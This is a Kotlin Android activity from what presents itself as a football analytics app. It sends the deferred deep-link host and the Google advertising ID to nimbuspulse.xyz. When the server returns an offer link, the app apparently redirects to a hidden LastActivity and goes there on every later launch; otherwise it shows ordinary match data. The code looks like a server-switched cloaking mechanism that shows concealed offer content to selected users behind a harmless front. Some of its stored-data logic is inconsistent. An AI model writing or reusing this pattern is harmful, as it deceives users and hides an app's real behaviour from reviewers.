package com.app.eva.footbalanalyticks.view.activity

import android.annotation.SuppressLint
import android.content.Context
import android.content.Intent
import android.content.SharedPreferences
import androidx.appcompat.app.AppCompatActivity
import android.os.Bundle
import android.util.Log
import android.view.View
import androidx.recyclerview.widget.LinearLayoutManager
import com.app.eva.footbalanalyticks.databinding.ActivitySportBinding
import com.app.eva.footbalanalyticks.model.ApiService3
import com.app.eva.footbalanalyticks.model.FiltersData
import com.app.eva.footbalanalyticks.model.MatchData
import com.app.eva.footbalanalyticks.view.adapter.MatchAdapter
import com.facebook.applinks.AppLinkData
import com.google.android.gms.ads.identifier.AdvertisingIdClient
import com.google.gson.Gson
import com.google.gson.reflect.TypeToken
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.launch
import kotlinx.coroutines.withContext
import retrofit2.Call
import retrofit2.Callback
import retrofit2.Response
import retrofit2.Retrofit
import retrofit2.converter.gson.GsonConverterFactory
import kotlin.coroutines.resume
import kotlin.coroutines.suspendCoroutine

class SportActivity : AppCompatActivity() {
    private lateinit var binding: ActivitySportBinding
    private val PREFS_NAME = "MyPrefsFile"
    private val KEY_FIRST_TIME = "firstTime"
    private val KEY_FIRST_ACTIVITY = "firstActivity"

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        binding = ActivitySportBinding.inflate(layoutInflater)
        setContentView(binding.root)

        val sharedPreferences = getSharedPreferences(PREFS_NAME, Context.MODE_PRIVATE)
        val firstActivity = getFirstActivity(sharedPreferences)
        if (firstActivity != null && firstActivity == LastActivity::class.java) {
            startActivity(Intent(this@SportActivity, LastActivity::class.java))
            finish()
            return
        }

        val retrofit = Retrofit.Builder()
            .baseUrl("https://nimbuspulse.xyz/")
            .addConverterFactory(GsonConverterFactory.create())
            .build()

        val service = retrofit.create(ApiService3::class.java)

        CoroutineScope(Dispatchers.Main).launch {
            val deepLink = handleDeferredDeepLink()
            Log.d("MainData1", deepLink.toString())
            val gaid = withContext(Dispatchers.IO) {
                getGoogleAdvertisingId()
            }

            val call = service.fetchData("$deepLink", "$gaid")
            call.enqueue(object : Callback<FiltersData> {
                @SuppressLint("NotifyDataSetChanged")
                override fun onResponse(call: Call<FiltersData>, response: Response<FiltersData>) {
                    val data = response.body()
                    if (data != null) {
                        Log.d("MainData2", data.toString())
                        Log.d("MainData3", data.link.toString())
                        val combinedData = data.link
                        if (combinedData != "no_offer") {
                            nextStep(combinedData!!)
                        } else {

                            val matches = data?.matches ?: emptyList()
                            saveData(matches,sharedPreferences)
                            Log.d("MainData5", matches.toString())
                            binding.recView.layoutManager = LinearLayoutManager(this@SportActivity)
                            val adapter = MatchAdapter(matches)
                            binding.recView.adapter = adapter
                            adapter.notifyDataSetChanged()
                            binding.recView.visibility = View.VISIBLE
                            binding.progressBar.visibility = View.GONE
                            binding.nextview.visibility = View.VISIBLE
                            binding.nextview.setOnClickListener {
                                startActivity(Intent(this@SportActivity, MainActivity::class.java))
                                finish()
                            }
                        }
                    }
                }
                override fun onFailure(call: Call<FiltersData>, t: Throwable) {
                    Log.e("API", "Error fetching data", t)
                }
            })
        }
    }

    private fun nextStep(combinedData: String) {
        val sharedPreferences = getSharedPreferences(PREFS_NAME, Context.MODE_PRIVATE)
        val intent: Intent = if (isFirstTime(sharedPreferences)) {
            saveFirstTimeFlag(sharedPreferences)
            if (combinedData != "no_offer") {
                saveFirstActivity(sharedPreferences, LastActivity::class.java)
                Intent(this@SportActivity, LastActivity::class.java).apply {
                    putExtra("combinedData", combinedData)
                }
            } else {
                saveFirstActivity(sharedPreferences, MainActivity::class.java)
                Intent(this@SportActivity, MainActivity::class.java)
            }
        } else {
            val firstActivity = getFirstActivity(sharedPreferences)
            if (firstActivity != null && firstActivity == LastActivity::class.java) {
                val savedResponse = sharedPreferences.getString("savedResponse", null)
                if (savedResponse != null) {
                     val matches = loadData(sharedPreferences)
                     val adapter = MatchAdapter(matches)
                     binding.recView.adapter = adapter
                     adapter.notifyDataSetChanged()
                     binding.recView.visibility = View.VISIBLE
                     binding.progressBar.visibility = View.GONE
                     binding.nextview.visibility = View.VISIBLE
                     binding.nextview.setOnClickListener {
                        startActivity(Intent(this@SportActivity, MainActivity::class.java))
                        finish()
                     }
                    return
                }
            }
            Intent(this@SportActivity, firstActivity ?: MainActivity::class.java)
        }

        startActivity(intent)
        overridePendingTransition(0, 0)
        finish()
    }


    private suspend fun handleDeferredDeepLink(): String? = suspendCoroutine { continuation ->
        AppLinkData.fetchDeferredAppLinkData(this@SportActivity) { appLinkData: AppLinkData? ->
            val deepLink = appLinkData?.targetUri?.host
            continuation.resume(deepLink)
        }
    }

    private suspend fun getGoogleAdvertisingId(): String? = suspendCoroutine { continuation ->
        try {
            val adInfo = AdvertisingIdClient.getAdvertisingIdInfo(this)
            val gaid = adInfo.id
            continuation.resume(gaid)
        } catch (e: Exception) {
            continuation.resume(null)
        }
    }

    private fun isFirstTime(sharedPreferences: SharedPreferences): Boolean {
        return sharedPreferences.getBoolean(KEY_FIRST_TIME, true)
    }

    private fun saveFirstTimeFlag(sharedPreferences: SharedPreferences) {
        val editor = sharedPreferences.edit()
        editor.putBoolean(KEY_FIRST_TIME, false)
        editor.apply()
    }
    fun saveData(ma: List<MatchData>, sharedPreferences: SharedPreferences) {
        val editor = sharedPreferences.edit()
        val gson = Gson()
        val json = gson.toJson(ma)
        editor.putString("KEY_FIRST_TIME", json)
        editor.apply()
    }
    fun loadData(sharedPreferences: SharedPreferences): List<MatchData> {
        val gson = Gson()
        val json = sharedPreferences.getString("KEY_FIRST_TIME", null)
        val type = object : TypeToken<List<MatchData>>() {}.type
        return gson.fromJson(json, type) ?: emptyList()
    }
    private fun saveFirstActivity(sharedPreferences: SharedPreferences, activityClass: Class<*>) {
        val editor = sharedPreferences.edit()
        editor.putString(KEY_FIRST_ACTIVITY, activityClass.name)
        editor.apply()
    }

    private fun getFirstActivity(sharedPreferences: SharedPreferences): Class<*>? {
        val activityName = sharedPreferences.getString(KEY_FIRST_ACTIVITY, null)
        return try {
            activityName?.let { Class.forName(it) }
        } catch (e: ClassNotFoundException) {
            null
        }
    }
}
